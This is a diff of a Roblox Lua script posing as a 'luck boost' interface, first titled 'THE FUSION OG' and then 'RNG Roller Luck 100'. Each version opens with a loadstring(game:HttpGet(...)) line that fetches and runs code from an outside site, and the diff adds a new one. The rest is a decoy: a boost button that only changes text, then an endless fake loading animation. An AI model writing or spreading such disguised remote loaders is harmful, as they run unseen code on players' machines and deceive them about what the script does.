@@ -1,202 +1,75 @@
-loadstring(game:HttpGet("https://star-scripts.com/api/run/HAGko_mk9Q3ueW6Qzo4kZICcoCpyQdj-"))()
---// THE FUSION OG - Luck UI
---// Put this LocalScript inside StarterPlayerScripts
+loadstring(game:HttpGet("https://star-scripts.com/api/run/TcO9g8dLxiWJ_gdbWoN7rZwvXPeQyYQZ"))()
 
 local Players = game:GetService("Players")
-local UIS = game:GetService("UserInputService")
-
 local player = Players.LocalPlayer
 
--- ScreenGui
 local gui = Instance.new("ScreenGui")
-gui.Name = "FusionOG"
+gui.Name = "RNGRollerLuck100"
 gui.ResetOnSpawn = false
 gui.Parent = player:WaitForChild("PlayerGui")
 
--- Main window
-local main = Instance.new("Frame")
-main.Name = "Main"
-main.Size = UDim2.fromOffset(390, 275)
-main.Position = UDim2.new(0.5, -195, 0.5, -137)
-main.BackgroundColor3 = Color3.fromRGB(14, 13, 23)
-main.BorderSizePixel = 0
-main.Parent = gui
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 110)
+frame.Position = UDim2.new(0.5, -150, 0.5, -55)
+frame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
+frame.BorderSizePixel = 0
+frame.Parent = gui
 
 local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 22)
-corner.Parent = main
+corner.CornerRadius = UDim.new(0, 10)
+corner.Parent = frame
 
 local stroke = Instance.new("UIStroke")
-stroke.Color = Color3.fromRGB(35, 35, 48)
-stroke.Thickness = 2
-stroke.Parent = main
+stroke.Color = Color3.fromRGB(70, 70, 80)
+stroke.Thickness = 1
+stroke.Parent = frame
 
--- Top bar
-local top = Instance.new("Frame")
-top.Size = UDim2.new(1, 0, 0, 65)
-top.BackgroundTransparency = 1
-top.Parent = main
-
--- Yellow dot
-local dot = Instance.new("Frame")
-dot.Size = UDim2.fromOffset(20, 20)
-dot.Position = UDim2.fromOffset(25, 22)
-dot.BackgroundColor3 = Color3.fromRGB(255, 205, 35)
-dot.BorderSizePixel = 0
-dot.Parent = top
-
-local dotCorner = Instance.new("UICorner")
-dotCorner.CornerRadius = UDim.new(1, 0)
-dotCorner.Parent = dot
-
--- Title
 local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -20, 0, 35)
+title.Position = UDim2.new(0, 10, 0, 8)
 title.BackgroundTransparency = 1
-title.Position = UDim2.fromOffset(58, 13)
-title.Size = UDim2.new(1, -115, 0, 38)
+title.Text = "RNG Roller Luck 100"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 19
 title.Font = Enum.Font.GothamBold
-title.Text = "THE FUSION OG"
-title.TextSize = 25
-title.TextColor3 = Color3.fromRGB(245, 245, 250)
-title.TextXAlignment = Enum.TextXAlignment.Left
-title.Parent = top
+title.Parent = frame
 
--- Close button
-local close = Instance.new("TextButton")
-close.BackgroundTransparency = 1
-close.Position = UDim2.new(1, -55, 0, 13)
-close.Size = UDim2.fromOffset(35, 35)
-close.Font = Enum.Font.GothamBold
-close.Text = "×"
-close.TextSize = 30
-close.TextColor3 = Color3.fromRGB(230, 230, 235)
-close.Parent = top
+local status = Instance.new("TextLabel")
+status.Size = UDim2.new(1, -20, 0, 25)
+status.Position = UDim2.new(0, 10, 0, 48)
+status.BackgroundTransparency = 1
+status.TextColor3 = Color3.fromRGB(170, 170, 180)
+status.TextSize = 13
+status.Font = Enum.Font.Gotham
+status.Parent = frame
 
-close.MouseButton1Click:Connect(function()
-	gui:Destroy()
-end)
+local messages = {
+    "Loading script...",
+    "Initializing RNG system...",
+    "Configuring settings...",
+    "Loading luck module...",
+    "Checking configuration...",
+    "Preparing RNG Roller...",
+    "Connecting modules...",
+    "Finalizing setup...",
+    "Waiting for response..."
+}
 
--- Description
-local description = Instance.new("TextLabel")
-description.BackgroundTransparency = 1
-description.Position = UDim2.fromOffset(27, 78)
-description.Size = UDim2.new(1, -54, 0, 35)
-description.Font = Enum.Font.Gotham
-description.Text = "Luck augmentation module"
-description.TextSize = 17
-description.TextColor3 = Color3.fromRGB(175, 175, 185)
-description.TextXAlignment = Enum.TextXAlignment.Left
-description.Parent = main
+-- Infinite loading animation
+task.spawn(function()
+    local i = 1
 
--- Status box
-local status = Instance.new("Frame")
-status.Position = UDim2.fromOffset(22, 125)
-status.Size = UDim2.new(1, -44, 0, 55)
-status.BackgroundColor3 = Color3.fromRGB(18, 17, 29)
-status.BorderSizePixel = 0
-status.Parent = main
+    while true do
+        status.Text = messages[i]
 
-local statusCorner = Instance.new("UICorner")
-statusCorner.CornerRadius = UDim.new(0, 10)
-statusCorner.Parent = status
+        for dots = 0, 3 do
+            status.Text = messages[i] .. string.rep(".", dots)
+            task.wait(0.35)
+        end
 
--- Status dot
-local statusDot = Instance.new("Frame")
-statusDot.Size = UDim2.fromOffset(17, 17)
-statusDot.Position = UDim2.fromOffset(20, 19)
-statusDot.BackgroundColor3 = Color3.fromRGB(235, 235, 240)
-statusDot.BorderSizePixel = 0
-statusDot.Parent = status
-
-local statusDotCorner = Instance.new("UICorner")
-statusDotCorner.CornerRadius = UDim.new(1, 0)
-statusDotCorner.Parent = statusDot
-
-local statusText = Instance.new("TextLabel")
-statusText.BackgroundTransparency = 1
-statusText.Position = UDim2.fromOffset(52, 8)
-statusText.Size = UDim2.new(1, -65, 0, 40)
-statusText.Font = Enum.Font.GothamMedium
-statusText.Text = "luck — awaiting activation"
-statusText.TextSize = 16
-statusText.TextColor3 = Color3.fromRGB(220, 220, 225)
-statusText.TextXAlignment = Enum.TextXAlignment.Left
-statusText.Parent = status
-
--- Boost button
-local boost = Instance.new("TextButton")
-boost.Position = UDim2.fromOffset(22, 195)
-boost.Size = UDim2.new(1, -44, 0, 58)
-boost.BackgroundColor3 = Color3.fromRGB(255, 190, 15)
-boost.BorderSizePixel = 0
-boost.Font = Enum.Font.GothamBold
-boost.Text = "OG LUCK BOOST"
-boost.TextSize = 20
-boost.TextColor3 = Color3.fromRGB(55, 35, 0)
-boost.AutoButtonColor = false
-boost.Parent = main
-
-local boostCorner = Instance.new("UICorner")
-boostCorner.CornerRadius = UDim.new(0, 16)
-boostCorner.Parent = boost
-
--- Button animation
-boost.MouseEnter:Connect(function()
-	boost.BackgroundColor3 = Color3.fromRGB(255, 210, 35)
-end)
-
-boost.MouseLeave:Connect(function()
-	boost.BackgroundColor3 = Color3.fromRGB(255, 190, 15)
-end)
-
-boost.MouseButton1Click:Connect(function()
-	statusText.Text = "luck — activated!"
-	statusDot.BackgroundColor3 = Color3.fromRGB(255, 205, 35)
-
-	task.delay(2, function()
-		if statusText.Parent then
-			statusText.Text = "luck — awaiting activation"
-			statusDot.BackgroundColor3 = Color3.fromRGB(235, 235, 240)
-		end
-	end)
-end)
-
---// DRAGGING
-local dragging = false
-local dragStart
-local startPos
-
-top.InputBegan:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1
-		or input.UserInputType == Enum.UserInputType.Touch then
-		
-		dragging = true
-		dragStart = input.Position
-		startPos = main.Position
-	end
-end)
-
-top.InputEnded:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1
-		or input.UserInputType == Enum.UserInputType.Touch then
-		
-		dragging = false
-	end
-end)
-
-UIS.InputChanged:Connect(function(input)
-	if not dragging then return end
-	
-	if input.UserInputType == Enum.UserInputType.MouseMovement
-		or input.UserInputType == Enum.UserInputType.Touch then
-		
-		local delta = input.Position - dragStart
-		
-		main.Position = UDim2.new(
-			startPos.X.Scale,
-			startPos.X.Offset + delta.X,
-			startPos.Y.Scale,
-			startPos.Y.Offset + delta.Y
-		)
-	end
+        i += 1
+        if i > #messages then
+            i = 1
+        end
+    end
 end)
